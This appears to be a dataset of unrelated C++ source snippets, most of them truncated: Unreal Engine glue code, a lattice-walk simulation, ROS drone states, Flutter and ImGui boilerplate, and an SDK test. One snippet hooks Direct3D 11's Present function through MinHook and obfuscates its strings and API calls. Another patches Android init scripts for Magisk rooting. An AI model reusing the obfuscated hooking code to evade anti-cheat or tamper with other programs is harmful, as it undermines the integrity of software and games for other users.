FNameNativePtrPair Funcs[] = {\n\t\t\t{ \"AsyncLevelLoad\", &UMainMenuWidget::execAsyncLevelLoad },\n\t\t\t{ \"OnPreheatFinished\", &UMainMenuWidget::execOnPreheatFinished },\n\t\t\t{ \"QuitGame\", &UMainMenuWidget::execQuitGame },\n\t\t\t{ \"StartGame\", &UMainMenuWidget::execStartGame },\n\t\t};\n\t\tFNativeFunctionRegistrar::RegisterFunctions(Class, Funcs, UE_ARRAY_COUNT(Funcs));\n\t}\n\tstruct Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics\n\t{\n\t\tstruct MainMenuWidget_eventAsyncLevelLoad_Parms\n\t\t{\n\t\t\tFString LevelDir;\n\t\t\tFString LevelName;\n\t\t};\n#if WITH_METADATA\n\t\tstatic const UECodeGen_Private::FMetaDataPairParam NewProp_LevelDir_MetaData[];\n#endif\n\t\tstatic const UECodeGen_Private::FStrPropertyParams NewProp_LevelDir;\n#if WITH_METADATA\n\t\tstatic const UECodeGen_Private::FMetaDataPairParam NewProp_LevelName_MetaData[];\n#endif\n\t\tstatic const UECodeGen_Private::FStrPropertyParams NewProp_LevelName;\n\t\tstatic const UECodeGen_Private::FPropertyParamsBase* const PropPointers[];\n#if WITH_METADATA\n\t\tstatic const UECodeGen_Private::FMetaDataPairParam Function_MetaDataParams[];\n#endif\n\t\tstatic const UECodeGen_Private::FFunctionParams FuncParams;\n\t};\n#if WITH_METADATA\n\tconst UECodeGen_Private::FMetaDataPairParam Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::NewProp_LevelDir_MetaData[] = {\n\t\t{ \"NativeConst\", \"\" },\n\t};\n#endif\n\tconst UECodeGen_Private::FStrPropertyParams Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::NewProp_LevelDir = { \"LevelDir\", nullptr, (EPropertyFlags)0x0010000000000080, UECodeGen_Private::EPropertyGenFlags::Str, RF_Public|RF_Transient|RF_MarkAsNative, nullptr, nullptr, 1, STRUCT_OFFSET(MainMenuWidget_eventAsyncLevelLoad_Parms, LevelDir), METADATA_PARAMS(UE_ARRAY_COUNT(Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::NewProp_LevelDir_MetaData), Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::NewProp_LevelDir_MetaData) };\n#if WITH_METADATA\n\tconst UECodeGen_Private::FMetaDataPairParam Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::NewProp_LevelName_MetaData[] = {\n\t\t{ \"NativeConst\", \"\" },\n\t};\n#endif\n\tconst UECodeGen_Private::FStrPropertyParams Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::NewProp_LevelName = { \"LevelName\", nullptr, (EPropertyFlags)0x0010000000000080, UECodeGen_Private::EPropertyGenFlags::Str, RF_Public|RF_Transient|RF_MarkAsNative, nullptr, nullptr, 1, STRUCT_OFFSET(MainMenuWidget_eventAsyncLevelLoad_Parms, LevelName), METADATA_PARAMS(UE_ARRAY_COUNT(Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::NewProp_LevelName_MetaData), Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::NewProp_LevelName_MetaData) };\n\tconst UECodeGen_Private::FPropertyParamsBase* const Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::PropPointers[] = {\n\t\t(const UECodeGen_Private::FPropertyParamsBase*)&Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::NewProp_LevelDir,\n\t\t(const UECodeGen_Private::FPropertyParamsBase*)&Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::NewProp_LevelName,\n\t};\n#if WITH_METADATA\n\tconst UECodeGen_Private::FMetaDataPairParam Z_Construct_UFunction_UMainMenuWidget_AsyncLevelLoad_Statics::Function_MetaDataParams[] = {\n\t\t{ \"Category\", \"Load\" },\n\t\t{ \"C",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include <iostream>\n#include <cstdlib>\n#include <vector>\n#include <set>\n#include <bits/stdc++.h>\n#include <array>\n#include <cmath>\n#include <algorithm>\n#include <random>\nusing namespace std;\n\n/*\nTakes input variables \n* n : maximum number of iterations before the algorithm stops\n* desired_length : the desired length of the SAW\n* x : fugacity term should be set between 0 and 1\n* d : dimension of walk\n* z : coordination number should be set to 2d\n* save : 1 to store the walk, 0 to avoid this step\n\n*/\n\n\n\ndouble eucl_dist(vector<int> final_pos)\n{\n    return sqrt(final_pos[0]*final_pos[0]+final_pos[1]*final_pos[1]);\n}\ndouble eucl_dist3D(vector<int> final_pos)\n{\n    return sqrt(final_pos[0]*final_pos[0]+final_pos[1]*final_pos[1]+final_pos[2]*final_pos[2]);\n}\ndouble Pplus(double x, double z)\n{\n    //Acceptance probability for positive move\n    return min(1.0,z*x/(1.0+x*z));\n}\nint delta_func(int xy, int xpyp)\n{\n    if (xy==xpyp)\n    {\n        return 1;\n    }\n    else\n    {\n        return 0;\n    }\n}\ndouble localField(int direction_minus_1,int direction_current)\n{\n    //Local Field will return number of curves at the point\n    return 1 - 2*double(delta_func(direction_current,direction_minus_1));\n}\ndouble Pneg(double x, double z)\n{\n    //Acceptance probability for negative move\n    return min(1.0,1.0/(1.0+x*z));\n}\n\nvoid SaveWalk(vector<vector<int>> coordinates)\n{\n    ofstream file;\n\n    //naming file to store results in\n    file.open(\"TwoStepBSSAW2DWeighted.csv\");\n    for (int i = 0; i < coordinates.size(); i++) \n    { \n        for ( \n            auto it = coordinates[i].begin(); \n            it != coordinates[i].end(); it++) \n            file << *it << \",\"; \n        file << endl; \n    } \n    file.close();\n}\n\nvector<double> TwoMoveBerrettiSokal(double x, double z, double d, int n, int desired_length,  int save)\n{\n    /*\n    x fugacity \n    z = 2*d\n    d dimension \n    n max number of iterations \n    desired_length required length of walk \n    save 1/0, save the walk to csv file/not\n    */\n\n\n    vector<int> row(d);\n    vector<int> temp_row(d);\n    \n    //make coordinates vector the length of n and cut off where necessary at the end\n    //maximum length of coordinates is n \n    double dS;\n    vector<vector<int>> coordinates;\n    coordinates.push_back(row);\n    set<vector<int>> checker;\n\n    //update the length and append set at the same time\n    //if values are the same, new coord is valid \n    int length {1};\n    double e2e{0};\n    checker.insert(row);\n\n    //initialise a vector to store all directions and store the current SAW checker set\n    //Make it of length n, this is the maximum length that could be needed\n    \n    vector<int> prev_directions;\n    int prev_dir;\n    \n    //Random number generator for getting the direction \n    default_random_engine generator(random_device{}());\n    uniform_int_distribution<int> direction(1,2*d);\n    uniform_real_distribution<double> percent(0,1);\n\n    \n\n    //second random number generator to determine which move to make\n    //uniform_int_distribution<int> atmosphere_choice(1,2);\n    vector <int> length_per_step;\n    int move {0};\n    int step {0};\n    double acc {0};\n    double r {0};\n    int random_number, removal;\n    double index {0};\n    bool zeros = std::all_of(row.begin(), row.end(), [](int i) { return i==0; });\n    int break_point{0};\n    while (length < desired_length)\n    {\n        break_point+=1;\n        if (break_point == n)\n        {\n            break;\n        }\n        //First move is positive move unbounded to any direction\n        //std::cout << \"\\n\";\n        //std::cout <<\"Before Move Row: \"<< row[0] << \" \" << row[1] << \"\\n\"; \n\n        zeros = std::all_of(row.begin(), row.end(), [](int i) { return i==0; });\n        if (zeros == true)\n        {\n            //std::cout << \"At Origin \\n\";\n            //check to see if the move should be accepted\n            \n            \n            step = direction(generator);\n            //std::cout << \"Step in: \"<< step <<\" Directions \\n\";\n            prev_directions.push_back(step);    \n            if (step%2 == 0)\n            {\n                index = (step/2) -1;\n                //make step\n                row[index] = row[index] - 1;\n                temp_row[index] = temp_row[index] - 1;\n            }\n            else if (step%2 !=0)\n            {   \n                step += 1;\n                index = (step/2) -1;\n                //make step\n                row[index] = row[index] + 1;\n                temp_row[index] = temp_row[index] + 1;\n            }\n            coordinates.push_back(row);\n            checker.insert(row);\n            length += 1;\n            length_per_step.push_back(length);\n        }\n\n        else \n        {\n            //If move is 1 > positive move to be made\n            //If move = 2 > negative move\n            acc = Pplus(x,z);\n            if (acc < 1)\n            {\n                r = percent(generator);\n                \n                if (r > acc)\n                {\n                    //std::cout <",
    "#include <sys/mount.h>\n#include <libgen.h>\n#include <sys/sysmacros.h>\n\n#include <sepolicy.hpp>\n#include <consts.hpp>\n#include <base.hpp>\n#include <flags.h>\n\n#include \"init.hpp\"\n\nusing namespace std;\n\nstatic vector<string> rc_list;\n\n#define NEW_INITRC_DIR  \"/system/etc/init/hw\"\n#define INIT_RC         \"init.rc\"\n\nstatic void patch_rc_scripts(const char *src_path, const char *tmp_path, bool writable) {\n    auto src_dir = xopen_dir(src_path);\n    if (!src_dir) return;\n    int src_fd = dirfd(src_dir.get());\n\n    // If writable, directly modify the file in src_path, or else add to rootfs overlay\n    auto dest_dir = writable ? [&] {\n        return xopen_dir(src_path);\n    }() : [&] {\n        char buf[PATH_MAX] = {};\n        ssprintf(buf, sizeof(buf), ROOTOVL \"%s\", src_path);\n        xmkdirs(buf, 0755);\n        return xopen_dir(buf);\n    }();\n    if (!dest_dir) return;\n    int dest_fd = dirfd(dest_dir.get());\n\n    // First patch init.rc\n    {\n        auto src = xopen_file(xopenat(src_fd, INIT_RC, O_RDONLY | O_CLOEXEC, 0), \"re\");\n        if (!src) return;\n        if (writable) unlinkat(src_fd, INIT_RC, 0);\n        auto dest = xopen_file(\n                xopenat(dest_fd, INIT_RC, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0), \"we\");\n        if (!dest) return;\n        LOGD(\"Patching \" INIT_RC \" in %s\\n\", src_path);\n        file_readline(false, src.get(), [&dest](string_view line) -> bool {\n            // Do not start vaultkeeper\n            if (str_contains(line, \"start vaultkeeper\")) {\n                LOGD(\"Remove vaultkeeper\\n\");\n                return true;\n            }\n            // Do not run flash_recovery\n            if (line.starts_with(\"service flash_recovery\")) {\n                LOGD(\"Remove flash_recovery\\n\");\n                fprintf(dest.get(), \"service flash_recovery /system/bin/true\\n\");\n                return true;\n            }\n            // Samsung's persist.sys.zygote.early will cause Zygote to start before post-fs-data\n            if (line.starts_with(\"on property:persist.sys.zygote.early=\")) {\n                LOGD(\"Invalidate persist.sys.zygote.early\\n\");\n                fprintf(dest.get(), \"on property:persist.sys.zygote.early.xxxxx=true\\n\");\n                return true;\n            }\n            // Else just write the line\n            fprintf(dest.get(), \"%s\", line.data());\n            return true;\n        });\n\n        fprintf(dest.get(), \"\\n\");\n\n        // Inject custom rc scripts\n        for (auto &script : rc_list) {\n            // Replace template arguments of rc scripts with dynamic paths\n            replace_all(script, \"${MAGISKTMP}\", tmp_path);\n            fprintf(dest.get(), \"\\n%s\\n\", script.data());\n        }\n        rc_list.clear();\n\n        // Inject Magisk rc scripts\n        rust::inject_magisk_rc(fileno(dest.get()), tmp_path);\n\n        fclone_attr(fileno(src.get()), fileno(dest.get()));\n    }\n\n    // Then patch init.zygote*.rc\n    for (dirent *entry; (entry = readdir(src_dir.get()));) {\n        auto name = std::string_view(entry->d_name);\n        if (!name.starts_with(\"init.zygote\") || !name.ends_with(\".rc\")) continue;\n        auto src = xopen_file(xopenat(src_fd, name.data(), O_RDONLY | O_CLOEXEC, 0), \"re\");\n        if (!src) continue;\n        if (writable) unlinkat(src_fd, name.data(), 0);\n        auto dest = xopen_file(\n                xopenat(dest_fd, name.data(), O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0), \"we\");\n        if (!dest) continue;\n        LOGD(\"Patching %s in %s\\n\", name.data(), src_path);\n        file_readline(false, src.get(), [&dest, &tmp_path](string_view line) -> bool {\n            if (line.starts_with(\"service zygote \")) {\n                LOGD(\"Inject zygote restart\\n\");\n                fprintf(dest.get(), \"%s\", line.data());\n                fprintf(dest.get(),\n                        \"    onrestart exec \" MAGISK_PROC_CON \" 0 0 -- %s/magisk --zygote-restart\\n\", tmp_path);\n                return true;\n            }\n            fprintf(dest.get(), \"%s\", line.data());\n            return true;\n        });\n        fclone_attr(fileno(src.get()), fileno(dest.get()));\n    }\n}\n\nstatic void load_overlay_rc(const char *overlay) {\n    auto dir = open_dir(overlay);\n    if (!dir) return;\n\n    int dfd = dirfd(dir.get());\n    // Do not allow overwrite init.rc\n    unlinkat(dfd, INIT_RC, 0);\n\n    // '/' + name + '\\0'\n    char buf[NAME_MAX + 2];\n    buf[0] = '/';\n    for (dirent *entry; (entry = xreaddir(dir.get()));) {\n        if (!str_ends(entry->d_name, \".rc\")) {\n            continue;\n        }\n        strscpy(buf + 1, entry->d_name, sizeof(buf) - 1);\n        if (access(buf, F_OK) == 0) {\n            LOGD(\"Replace rc script [%s]\\n\", entry->d_name);\n        } else {\n            LOGD(\"Found rc script [%s]\\n\", entry->d_name);\n            int rc = xopenat(dfd, entry->d_name, O_RDONLY | O_CLOEXEC);\n            rc_list.push_back(full_read(rc));\n            close(rc);\n            unlinkat(dfd, entry->d_name, 0);\n        }\n    }\n}\n\nstatic void recreate_sbin(const char *mirror, bool",
    "#include \"SF_InactiveState.h\"\n\n/* Public Methods and Constructor */\nSFInactiveState::SFInactiveState(string state_label, ros::ServiceClient &arming_service_client, \n                                ros::ServiceClient &set_flight_mode_client) : \n                                SFBaseState(state_label), arming_service_client(arming_service_client), \n                                set_flight_mode_client(set_flight_mode_client), start_position(Vector3d::Zero())\n{\n    // Add the neighbor states\n    addNeighborState(string(\"Take-off\"), [this]() { return defaultTransitionGuard(); });\n}\n\nvoid SFInactiveState::entry(const Vector3d &curr_position, const Vector3d &prev_desired_position, string &args)\n{\n    // Reset the desired state\n    setDesiredState(getStateLabel());\n\n    // Set start position\n    start_position = curr_position;\n\n    // Switch to Stabilize flight mode\n    mavros_msgs::SetMode flight_mode_srv;\n    flight_mode_srv.request.base_mode = 0;//flight_mode_srv.request.MAV_MODE_STABILIZE_ARMED;\n    flight_mode_srv.request.custom_mode = string(\"STABILIZE\"); //string(\"\");\n    uint16_t attempt_counter = 0;\n    while(!(set_flight_mode_client.call(flight_mode_srv) && flight_mode_srv.response.mode_sent) && (attempt_counter < 10))\n    {\n        attempt_counter++;\n        ROS_INFO(\"Failed to change flight mode, reattempting in 100ms\");\n        ros::Duration(0.1).sleep();\n    }\n\n    // If unsuccessful then wait for manual flight mode change\n    if(attempt_counter == 10)\n    {\n        double wait_time = 15.0;\n        ROS_INFO(\"Please change flight mode to STABILIZE manually\");\n        while(wait_time > 0)\n        {\n            ROS_INFO(\"Attemping to disarm in %.2f seconds\", wait_time);\n            wait_time -= 1.0;\n            ros::Duration(1.0).sleep();\n        }\n    }\n    // Mode change successful\n    else\n    {\n        ROS_INFO(\"Changed flight mode successfully, active mode: STABILIZE\");\n        ROS_INFO(\"Disarming in %.2f seconds\", 1.0);\n        ros::Duration(1.0).sleep();\n    }\n\n    // Disarm the motors\n    mavros_msgs::CommandBool arming_srv;\n    arming_srv.request.value = false;\n    attempt_counter = 0;\n    while(!(arming_service_client.call(arming_srv) && arming_srv.response.success) && (attempt_counter < 20))\n    {\n        attempt_counter++;\n        ROS_INFO(\"Failed to disarm, reattempting in 250ms\");\n        ros::Duration(0.25).sleep();\n    }\n\n    // Failed to disarm after all attempts\n    if(attempt_counter == 20)\n    {\n        ROS_ERROR(\"Cannot disarm, please disarm manually!!\");\n    }\n    // Disarmed successfully\n    else\n    {\n        ROS_INFO(\"Disarmed successfully\");\n    }\n}\n\n/* Protected Methods */\n\nMatrix3d SFInactiveState::during()\n{\n    // Construct the desired trajectory matrix\n    Matrix3d desired_traj;\n    Vector3d zero_vect = Vector3d::Zero();\n    desired_traj << start_position, zero_vect, zero_vect;\n    \n    return desired_traj;\n}\n\nbool SFInactiveState::exit(string &exit_status)\n{\n    // Switch to GUIDED_NOGPS flight mode\n    mavros_msgs::SetMode flight_mode_srv;\n    flight_mode_srv.request.base_mode = 0;\n    flight_mode_srv.request.custom_mode = string(\"GUIDED_NOGPS\");\n    uint16_t attempt_counter = 0;\n    while(!(set_flight_mode_client.call(flight_mode_srv) && flight_mode_srv.response.mode_sent) && (attempt_counter < 10))\n    {\n        attempt_counter++;\n        ROS_INFO(\"Failed to change flight mode, reattempting in 100ms\");\n        ros::Duration(0.1).sleep();\n    }\n\n    // If unsuccessful then wait for manual flight mode change\n    if(attempt_counter == 10)\n    {\n        double wait_time = 20.0;\n        ROS_INFO(\"Please change flight mode to GUIDED_NOGPS manually\");\n        while(wait_time > 0)\n        {\n            ROS_INFO(\"Attemping to arm in %.2f seconds\", wait_time);\n            wait_time -= 1.0;\n            ros::Duration(1.0).sleep();\n        }\n    }\n    // Mode change successful\n    else\n    {\n        ROS_INFO(\"Changed flight mode successfully, active mode: GUIDED_NOGPS\");\n        ROS_INFO(\"Arming in %.2f seconds\", 2.0);\n        ros::Duration(2.0).sleep();\n    }\n\n    // Arm the motors\n    mavros_msgs::CommandBool srv;\n    srv.request.value = true;\n    attempt_counter = 0;\n    while(!(arming_service_client.call(srv) && srv.response.success) && (attempt_counter < 20))\n    {\n        attempt_counter++;\n        srv.request.value = true;\n        ROS_INFO(\"%s\", \"\\nFailed to arm, reattempting in 2s\");\n        ros::Duration(2.0).sleep();\n    }\n\n    // Failed to Arm after all attempts\n    if(attempt_counter == 20)\n    {\n        setDesiredState(getStateLabel());\n        ROS_INFO(\"%s\", \"Cannot arm, state transition aborted!!\");\n        return false;\n    }\n    // Armed successfully\n    else\n    {   \n        exit_status += string(\"\\nArmed successfully\");\n        ros::Duration(2.0).sleep();\n        return true;\n    }\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui, v1.89.2\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// -------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n// -------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n// Message to beginner C/C++ programmers about the meaning of the 'static' keyword:\n// In this demo code, we frequently use 'static' variables inside functions. A static variable persists across calls,\n// so it is essentially like a global variable but declared inside the scope of the function. We do this as a way to\n// gather code and data in the same place, to make the demo source code faster to read, faster to write, and smaller\n// in size. It also happens to be a convenient way of storing simple UI related information as long as your function\n// doesn't need to be reentrant or used in multiple threads. This might be a pattern you will want to use in your code,\n// but most of the real data you would be editing is likely going to be stored outside your functions.\n\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui_internal.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example App: Constrained Resize / ShowExampleAppConstrainedResize()\n// [SECTION] Example App: Simple overlay / ShowExampleAppSimpleOverlay()\n// [SECTION] Example App: Fullscreen window / ShowExampleAppFullscreen()\n// [SECTION] Example App: Manipulating window titles / ShowExampleAppWindowTitles()\n// [SECTION] Example App: Custom Rendering using ImDrawList API / ShowExampleAppCustomRendering()\n// [SECTION]",
    "/**************************************************************************************************\r\n *\r\n * Copyright (c) 2019-2023 Axera Semiconductor (Ningbo) Co., Ltd. All Rights Reserved.\r\n *\r\n * This source file is the property of Axera Semiconductor (Ningbo) Co., Ltd. and\r\n * may not be copied or distributed in any isomorphic form without the prior\r\n * written consent of Axera Semiconductor (Ningbo) Co., Ltd.\r\n *\r\n **************************************************************************************************/\r\n#include \"ax_skel_api.h\"\r\n#include \"ax_engine_api.h\"\r\n\r\n#include <cstdio>\r\n#include <thread>\r\n#include <chrono>\r\n\r\n#include \"test_utils.h\"\r\n\r\nAX_VOID HvcfpResultCallback(AX_SKEL_HANDLE pHandle, AX_SKEL_RESULT_T *pstResult, AX_VOID *pUserData) {\r\n    printf(\"Detected %d objects\\n\", pstResult->nObjectSize);\r\n\r\n    const char* filename = (const char*)pUserData;\r\n    cv::Mat result_img = DrawResult(filename, pstResult);\r\n    if (result_img.empty()) {\r\n        printf(\"DrawResult failed!\\n\");\r\n    } else {\r\n        cv::imwrite(\"result.jpg\", result_img);\r\n        printf(\"Saved result to result.jpg\\n\");\r\n    }\r\n}\r\n\r\nint main(int argc, char** argv) {\r\n    if (argc < 2) {\r\n        printf(\"Usage: %s 